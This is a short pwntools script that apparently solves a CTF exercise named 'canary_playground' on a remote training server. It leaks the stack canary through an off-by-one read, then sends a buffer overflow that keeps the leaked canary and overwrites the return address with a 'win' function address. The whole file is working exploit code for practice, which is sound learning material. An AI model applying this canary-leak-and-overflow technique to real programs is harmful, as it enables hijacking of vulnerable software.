from pwn import *
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Util.number import long_to_bytes, bytes_to_long
import string
import math

elf = ELF("./canary_playground")
p = elf.process()
p = remote("cyberchallenge.diag.uniroma1.it", 5053)
p.send(b"A"*40 + b"B")
junk = p.recvuntil(b"B")
junk = p.recvuntil(b">")[:-1]
print(junk[:-8])
canary = b"\x00" + junk[:7]
base_ptr = junk[8:].ljust(8, b"\x00")
print("canary is: ", canary)
print("base_ptr is: ", base_ptr)
win = 0x4011D6
payload = b"A"*40
payload += canary
payload += b"B"*8
payload += p64(win)
p.send(payload)
print(payload)
# canary_end = p.recvline()[:-1]
# canary = b"\x00" + canary_end
# print(junk)
# print(canary)
p.interactive()